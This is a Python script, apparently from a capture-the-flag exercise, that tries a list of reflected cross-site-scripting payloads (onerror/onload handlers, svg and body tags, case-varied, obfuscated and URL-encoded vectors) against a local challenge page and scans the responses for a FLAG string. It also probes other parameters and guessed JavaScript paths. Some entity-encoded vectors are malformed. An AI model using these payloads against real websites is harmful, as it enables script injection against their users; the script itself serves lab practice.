import requests
import re
import urllib.parse
import base64

url = "http://127.0.0.1:33203/page"

# The CSS reference "xss23.css" might be a hint - let me try XSS23 related values
print("[+] Testing XSS-related inputs based on CSS hint 'xss23'...")

# Try different XSS vectors that might be the "solution"
xss_vectors = [
    # Classic simple XSS (bypassing filters)
    "\"onload=alert()",
    "'onload=alert()",
    "javascript:alert()",
    "data:text/html,<script>alert()</script>",
    
    # DOM-based or attribute-based
    "x\" onerror=alert()",
    "x\" onclick=alert()",
    
    # Image-based
    "<image src=x onerror=alert()>",  # <image> sometimes works instead of <img>
    "<img src=\"x\" onerror=alert()>",
    
    # Different case
    "<IMG SRC=x ONERROR=alert()>",
    "<Img Src=x Onerror=alert()>",
    
    # Obfuscated
    "<img src=x onerror=alert`1`>",  # Using template literals
    "<img src=x onerror=alert&lp;1&rp;>",  # HTML entities
    
    # Encoded
    "%3Cimg%20src%3Dx%20onerror%3Dalert%28%27XSS%27%29%3E",  # Already encoded
    "<svg onload=alert(1)>",
    "<body onload=alert(1)>",
    
    # Try numbers from CSS name
    "xss23",
    "XSS23",
    "23",
    "level23",
    "challenge23",
    "star",  # from "dalgona star"
    "dalgona",
]

print(f"Testing {len(xss_vectors)} XSS vectors...")
print("="*80)

for i, vector in enumerate(xss_vectors, 1):
    # URL encode the vector
    encoded_vector = urllib.parse.quote(vector)
    test_url = f"{url}?name={encoded_vector}"
    
    response = requests.get(test_url)
    response_text = response.text
    
    # Extract the solution text
    solution_match = re.search(r'<div class="solution-text">(.*?)</div>', response_text, re.DOTALL)
    if solution_match:
        solution_text = re.sub(r'<[^>]+>', '', solution_match.group(1)).strip()
        
        # Check if it's different from the default
        if "Failed! Try again!" in solution_text:
            print(f"[-] {i:2}. BLOCKED: {vector}")
        elif "Let the game begin. Good Luck" in solution_text:
            print(f"[ ] {i:2}. DEFAULT: {vector}")
        else:
            print(f"[!] {i:2}. DIFFERENT: {vector}")
            print(f"      Response: {solution_text[:100]}")
            
            # Check for flag in this response
            flag_matches = re.findall(r'FLAG\{[^}]+\}', solution_text)
            if flag_matches:
                print(f"      [!] FLAG FOUND! {flag_matches}")
                break
    
    # Also check full response for flags
    full_flag_matches = re.findall(r'FLAG\{[^}]+\}', response_text)
    if full_flag_matches:
        print(f"[!] {i:2}. FLAG IN FULL RESPONSE: {vector}")
        print(f"      Flags: {full_flag_matches}")
        break
else:
    print("[-] No flags found in XSS vector tests")

# If no XSS vectors worked, maybe try a different parameter injection
print(f"\n{'='*80}")
print("[+] Trying alternative parameter names...")

alt_params = ['user', 'username', 'email', 'pass', 'password', 'id', 'uid', 'data', 'value']

for param in alt_params:
    test_url = f"{url}?{param}=<script>alert(1)</script>"
    response = requests.get(test_url)
    
    if '<script>' in response.text:
        print(f"[!] Parameter '{param}' reflects unfiltered HTML!")
        # Check for flag with this param
        flag_resp = requests.get(f"{url}?{param}=FLAG_test")
        flag_matches = re.findall(r'FLAG\{[^}]+\}', flag_resp.text)
        if flag_matches:
            print(f"[!] FLAG FOUND with param '{param}': {flag_matches}")
            break

# Try a different approach - look at the form submission itself
print(f"\n{'='*80}")
print("[+] Analyzing form submission behavior...")

# The form might be processed by JavaScript that we can't see directly
# Try accessing different paths that might contain the backend logic
backend_paths = [
    '/js/main.js',
    '/js/app.js',
    '/js/xss23.js',
    '/static/js/main.js',
    '/static/js/xss.js',
]

for path in backend_paths:
    js_url = f"{url.rsplit('/', 1)[0]}{path}"
    js_resp = requests.get(js_url)
    
    if js_resp.status_code == 200:
        print(f"[+] Found JS file: {js_url}")
        js_content = js_resp.text
        
        # Look for flag patterns in JavaScript
        flag_matches = re.findall(r'FLAG\{[^}]+\}', js_content)
        if flag_matches:
            print(f"[!] FLAG FOUND IN JS: {flag_matches}")
            break
        
        # Look for form handlers or validation logic
        if 'querySelector' in js_content or 'getElementById' in js_content or 'form' in js_content:
            print(f"[+] Form handling detected - here's the logic:")
            # Print relevant lines
            for line in js_content.split('\n'):
                if any(keyword in line.lower() for keyword in ['form', 'submit', 'input', 'name']):
                    print(f"    {line.strip()}")
else:
    print("[-] No additional JS files found")

# One more check - maybe the flag is in a different encoding
print(f"\n{'='*80}")
print("[+] Checking for encoded flags...")

base_response = requests.get(f"{url}")
content = base_response.text

# Check for hex strings that could be flags
hex_strings = re.findall(r'[a-fA-F0-9]{32,}', content)
if hex_strings:
    print(f"[+] Found {len(hex_strings)} potential hex strings")
    for hex_str in hex_strings[:5]:
        print(f"    {hex_str}")

# Check for base64 strings
import base64
b64_strings = re.findall(r'[A-Za-z0-9+/]{20,}={0,2}', content)
for b64_str in b64_strings:
    try:
        decoded = base64.b64decode(b64_str).decode('utf-8', errors='ignore')
        if len(decoded) > 10 and decoded.isprintable():
            print(f"[+] Base64: {b64_str}")
            print(f"    Decoded: {decoded}")
            
            if 'FLAG{' in decoded.upper():
                print(f"[!] FLAG FOUND IN BASE64!")
                break
    except:
        pass
